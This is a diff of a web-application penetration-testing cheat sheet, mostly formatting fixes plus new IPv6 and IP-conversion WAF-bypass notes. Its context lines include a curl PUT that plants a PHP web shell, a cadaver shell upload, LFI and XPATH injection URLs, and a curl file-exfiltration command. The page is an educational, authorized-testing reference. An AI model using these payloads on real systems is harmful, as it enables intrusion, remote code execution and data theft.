@@ -9,13 +9,13 @@ description: >-
 {% hint style="success" %}
 Hack Responsibly.
 
-Always ensure you have **explicit** permission to access any computer system **before** using any of the techniques contained in these documents.  You accept full responsibility for your actions by applying any knowledge gained here.  
+Always ensure you have **explicit** permission to access any computer system **before** using any of the techniques contained in these documents.  You accept full responsibility for your actions by applying any knowledge gained here. &#x20;
 {% endhint %}
 
 ## Checklist
 
 * [ ] View SSL certificates for domains, emails, usernames
-* [ ] View source code 
+* [ ] View source code&#x20;
 * [ ] Check `/robots.txt`, `.htaccess`, `.htpasswd`
 * [ ] Check HTTP Request/Response headers
 * [ ] Check for files/directories with `gobuster`/`dirbuster`
@@ -23,10 +23,10 @@ Always ensure you have **explicit** permission to access any computer system **b
 * [ ] View console
 * [ ] Use `nikto`
 * [ ] Check HTTP OPTIONS
-* [ ] HTTP PUT / POST File upload 
+* [ ] HTTP PUT / POST File upload&#x20;
 * [ ] Parameter fuzzing with `ffuf`
 * [ ] Browser vs. Burp response
-* [ ] Shell shock \(`cgi-bin/status`\)
+* [ ] Shell shock (`cgi-bin/status`)
 * [ ] Make wordlist with `cewl` and directory/login brute force
 * [ ] `nmap --script http-enum 10.10.10.10`
 * [ ] Apache version exploit & other base server exploits
@@ -110,8 +110,8 @@ Authorization: AWS4-HMAC-SHA256 Credential=abc/20200618/us-east-1/execute-api/aw
 2. [X-XSS-Protection](https://www.netsparker.com/whitepaper-http-security-headers/#XXSSProtectionHTTPHeader)
 3. [X-Content-Type-Options](https://www.netsparker.com/whitepaper-http-security-headers/#XContentTypeOptionsHTTPHeader)
 4. [X-Download-Options](https://www.netsparker.com/whitepaper-http-security-headers/#XDownloadOptionsHTTPHeader)
-5. [Content Security Policy \(CSP\)](https://www.netsparker.com/whitepaper-http-security-headers/#ContentSecurityPolicyHTTPHeader)
-6. [HTTP Strict Transport Security \(HSTS\)](https://www.netsparker.com/whitepaper-http-security-headers/#HTTPStrictTransportSecurityHSTSHTTPHeader)
+5. [Content Security Policy (CSP)](https://www.netsparker.com/whitepaper-http-security-headers/#ContentSecurityPolicyHTTPHeader)
+6. [HTTP Strict Transport Security (HSTS)](https://www.netsparker.com/whitepaper-http-security-headers/#HTTPStrictTransportSecurityHSTSHTTPHeader)
 7. [HTTP Public Key Pinning](https://www.netsparker.com/whitepaper-http-security-headers/#HTTPPublicKeyPinning)
 8. [Expect-CT](https://www.netsparker.com/whitepaper-http-security-headers/#ExpectCTHTTPHeader)
 9. [Referrer-Policy](https://www.netsparker.com/whitepaper-http-security-headers/#ReferrerPolicyHTTPHeader)
@@ -246,7 +246,7 @@ document.cookie;
 	header["Cookie"] = HTTP::Cookie.cookie_value(jar.cookies(uri))
 ```
 
-### Python2
+### Python2&#xD;
 
 ```bash
 # python has a cookie library!
@@ -258,27 +258,27 @@ opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
 r = opener.open("http://example.com/")
 ```
 
-### Edit cookies in chrome
+### Edit cookies in chrome&#xD;
 
-Settings -&gt; Advanced Settings -&gt; Privacy -&gt; Content -&gt; Cookies
+Settings -> Advanced Settings -> Privacy -> Content -> Cookies
 
 or "Edit This Cookie" plugin
 
 
 
-### Edit cookies in firefox
+### Edit cookies in firefox&#xD;
 
-Preferences -&gt; Privacy -&gt; Show Cookies
+Preferences -> Privacy -> Show Cookies
 
 or "Cookies Manager+" addon
 
-## Local File Inclusion \(LFI\) / Remote File Inclusion \(RFI\)
+## Local File Inclusion (LFI) / Remote File Inclusion (RFI)
 
-Common and/or useful files to check for when exploiting Local File Inclusion \(for both Linux and Windows\): [https://github.com/tennc/fuzzdb/tree/master/dict/BURP-PayLoad/LFI](https://github.com/tennc/fuzzdb/tree/master/dict/BURP-PayLoad/LFI)
+Common and/or useful files to check for when exploiting Local File Inclusion (for both Linux and Windows): [https://github.com/tennc/fuzzdb/tree/master/dict/BURP-PayLoad/LFI](https://github.com/tennc/fuzzdb/tree/master/dict/BURP-PayLoad/LFI)
 
 ### LFI - Retrieve HTML/PHP files without executing
 
-```text
+```
 https://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php
 ```
 
@@ -293,7 +293,7 @@ curl -X PUT -d '<?php system($_GET["cmd"]);?>' http://$ip/rev.php
 
 **Cadaver**
 
-```text
+```
 cadaver http://10.10.10.10/dav/put /tmp/shell.php
 ```
 
@@ -332,6 +332,25 @@ netstat -tulpn
 
 ## Misc
 
+### IPv6
+
+primer: [Ippsec:HacktheBox - Sneaky](https://www.youtube.com/watch?v=1UGxjqTnuyo)
+
+```
+fe80::/10 - febf:ffff:ffff:ffff:ffff:ffff:ffff:ffff Unique Link Local 169.254.x.x APIPA 
+(built from MAC address on Linux, 7th bit flips, adds ff:fe in the center)
+
+fc00::/7 - fdff:ffff:ffff:ffff:ffff:ffff:ffff:ffff Unique Local Unicast 10.x.x.x, 172.16.x.x, 192.168.x.x 
+
+2000::/3 - Global Unicast routable 
+
+ff02::1 - Multicast All Nodes 
+
+ff02::2 Multicast ROUTER nodes
+```
+
+ip6tables - iptables for ipv6
+
 ### HTTP Authentication Types
 
 ```bash
@@ -345,17 +364,17 @@ Form-Based Authentication
 
 ### XPATH Dump
 
-```text
+```
 https://example.com/accounts.php?user=test"]/../*%00&xpath_debug=1
 ```
 
 whatismybrowser.com - research User-Agent strings
 
-Use `curl` to exfiltrate file on remote server \(from attackers box\): `curl -d @/<file> <remote server>`
+Use `curl` to exfiltrate file on remote server (from attackers box): `curl -d @/<file> <remote server>`
 
 in order to proxy tools that have no proxy option: create burn proxy 127.0.0.1:80 [Ippsec:HacktheBox - Granny & Grandpa](https://www.youtube.com/watch?v=ZfPVGJGkORQ)
 
-vulnerability testing for webdav \(or other file upload vulns!\): `davtest`
+vulnerability testing for webdav (or other file upload vulns!): `davtest`
 
 bypassing filetype filters with http MOVE command to rename allowed filetype [Ippsec:HacktheBox - Granny & Grandpa](https://www.youtube.com/watch?v=ZfPVGJGkORQ)
 
@@ -369,7 +388,7 @@ hydra against http wordpress login walkthrough: [IppSec:HacktheBox - Apocalyst](
 
 web application fuzzer: [wfuzz](https://github.com/xmendez/wfuzz)
 
-Web site "flyover" surveillance: [Aquatone](https://github.com/michenriksen/aquatone) "is a tool for visual inspection of websites across a large amount of hosts and is convenient for quickly gaining an overview of HTTP-based attack surface" - from the author \(see link\). Visual dirbuster?
+Web site "flyover" surveillance: [Aquatone](https://github.com/michenriksen/aquatone) "is a tool for visual inspection of websites across a large amount of hosts and is convenient for quickly gaining an overview of HTTP-based attack surface" - from the author (see link). Visual dirbuster?
 
 ### Crawl web pages for keywords - useful for password/vhost enumeration lists
 
@@ -424,9 +443,10 @@ curl http://example.com/crossdomain.xml
     # allow-access-from domain="*"
 ```
 
+### IP conversion
 
+Injecting IPs when '**`.`**' is disallowed: convert the standard "dotted decimal" format to decimal, or hex value using -[ip2dh](https://github.com/4ndr34z/MyScripts/blob/master/ip2dh.py).  The sending or receiving computer will usually automatically convert it to a format that it can use.  This is a great way to bypass WAF, IDS, or other tools that filter on IPs.
 
 
 
 If you like this content and would like to see more, please consider [buying me a coffee](https://www.buymeacoffee.com/zweilosec)!
-
